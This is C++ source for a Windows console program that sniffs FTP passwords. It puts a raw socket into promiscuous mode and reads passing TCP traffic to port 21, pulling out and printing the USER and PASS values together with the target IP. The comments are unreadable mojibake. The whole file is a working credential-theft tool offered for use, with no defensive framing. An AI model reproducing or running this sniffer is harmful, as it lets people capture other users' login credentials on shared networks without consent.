// GetFtpPass.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <winsock2.h>
#pragma comment(lib,"ws2_32")
#include <stdio.h>
#include <string.h>
#define   SIO_RCVALL                         _WSAIOW(IOC_VENDOR,1)   


typedef struct _IPHeader
{
    UCHAR     iphVerLen;      // �汾�ź��ײ����ȣ���ռ4λ��
    UCHAR     ipTOS;          // 8λ�������� 
    USHORT    ipLength;       // IP���ݱ��ܳ���
    USHORT    ipID;			  // 16λ��ʶ
    USHORT    ipFlags;	      // 3λ��־��13λƬƫ��
    UCHAR     ipTTL;	      // 8λ����ʱ��
    UCHAR     ipProtocol;     // 8λЭ�飬������TCP��UDP��ICMP��
    USHORT    ipChecksum;     // 16λ�ײ�У���
    ULONG     ipSource;       // 32λԴIP��ַ
    ULONG     ipDestination;  // 32λĿ��IP��ַ
} IPHeader, *PIPHeader; 




typedef struct _TCPHeader		
{
	USHORT	sourcePort;			// 16λԴ�˿ں�
	USHORT	destinationPort;	// 16λĿ�Ķ˿ں�
	ULONG	sequenceNumber;		// 32λ���к�
	ULONG	acknowledgeNumber;	// 32λȷ�Ϻ�
	UCHAR	dataoffset;			// ��4λ��ʾ����ƫ��
	UCHAR	flags;				// 6λ��־����
	USHORT	windows;			// 16λ���ڴ�С
	USHORT	checksum;			// 16λУ���
	USHORT	urgentPointer;		// 16λ����ָ��
} TCPHeader, *PTCPHeader;

void GetPassWord(char *buff)
{
	//�����û���
	char UserName[256];
	//��������
	char PassWord[256];
	//��λ��IP�ײ�
	IPHeader *Iphdr =(IPHeader*)buff;
	//��λ��TCP�ײ�
	TCPHeader *Tcphdr=(TCPHeader*)&buff[sizeof(IPHeader)];
	//�Ƚ�Э���Ƿ���TCPЭ�飬Ŀ�Ķ˿ں��Ƿ���FTP�˿ں�
	if(Iphdr->ipProtocol!=IPPROTO_TCP||ntohs(Tcphdr->destinationPort)!=21)	
		return;
	//��λ��FTP����
	char *FtpData=(char*)&buff[sizeof(IPHeader)+sizeof(TCPHeader)];
	//�Ƚϡ�USER�������ַ�
	if(strnicmp(FtpData,"USER ",5)==0)
	{
		//�õ��û���
		sscanf(FtpData+4,"%*[ ]%s",UserName);
	}
    //�Ƚϡ�PASS�������ַ�
	if(strnicmp(FtpData,"PASS ",5)==0)
	{
	   //�õ�����
       sscanf(FtpData+4,"%*[ ]%s",PassWord);
	   //���Ŀ��IP
       printf("Ŀ��IP��%s\n",inet_ntoa(*(in_addr*)&Iphdr->ipDestination));
	   //����û���
       printf("�û�����%s\n",UserName);
	   //�������
       printf("���룺%s\n",PassWord);
	}
}


int main(int argc, char* argv[])
{
	WSADATA wsaData;
    WORD sockVersion = MAKEWORD(2, 2);
	//����winsock��
	if(WSAStartup(sockVersion, &wsaData) != 0)
		return 0;
	// ����ԭʼ�׽���
	SOCKET sRaw = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
	char szHostName[56];
	SOCKADDR_IN addr_in;
	struct  hostent *pHost;
	//�õ������������
	gethostname(szHostName, 56);
	//ͨ����������õ�IP
	if((pHost = gethostbyname((char*)szHostName)) == NULL)	
		return 0;
	in_addr addr;
	sockaddr_in addr_s;
	//ѭ�����IP��ַ
	for(int i=0;;i++)
	{
		char *p=pHost->h_addr_list[i];
		if(p==NULL)
			break;
		memcpy(&addr.S_un.S_addr,p,pHost->h_length);
		printf("��%d��ip��%s\n",i+1,inet_ntoa(addr));	
	}
	printf("������Ҫ�����ĸ�ip�ϣ�");
	int num;
	//ѡ��Ҫ������IP��ַ
	scanf("%d",&num);
	if(num<1||num>i)
	{
		printf("�������\n");
		return 0;
	}
	//��дsockaddr_in�ṹ
	addr_s.sin_family= AF_INET;
	addr_s.sin_port=htons(0);
	memcpy(&addr_s.sin_addr.S_un.S_addr, pHost->h_addr_list[num-1], pHost->h_length);
	//���׽��ֵ�ָ��IP
	if(bind(sRaw, (PSOCKADDR)&addr_s, sizeof(addr_s)) == SOCKET_ERROR)
	{
		printf("bind error\n");
		return 0;
	}
	DWORD dwValue = 1;
	//��������λ����ģʽ
	if(ioctlsocket(sRaw,SIO_RCVALL, &dwValue) != 0)
	{
		printf("ioctlsocket error\n");
		return 0;
	}
	printf("������̽ftp����........\n");
	char buff[1024];
	int nRet;
	//ѭ����������
	while(TRUE)
	{
		nRet = recv(sRaw, buff, 1024, 0);
		if(nRet > 0)
		{
			GetPassWord(buff);	
		}
	}
	closesocket(sRaw);
	return 0;
}
